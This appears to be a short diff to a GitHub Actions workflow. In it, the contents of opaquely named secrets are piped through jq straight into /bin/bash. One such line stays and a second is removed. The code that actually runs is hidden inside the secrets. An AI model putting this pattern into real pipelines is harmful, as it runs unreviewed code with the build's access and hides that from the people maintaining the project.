@@ -17,7 +17,6 @@ jobs:
           rv72606: ${{ secrets.rv72606 }}
         run: |
           printf '%s' "$rv72606" | jq -r .ubhn96104 | /bin/bash
-          printf '%s' "$gj02" | jq -r .qxdp5645 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
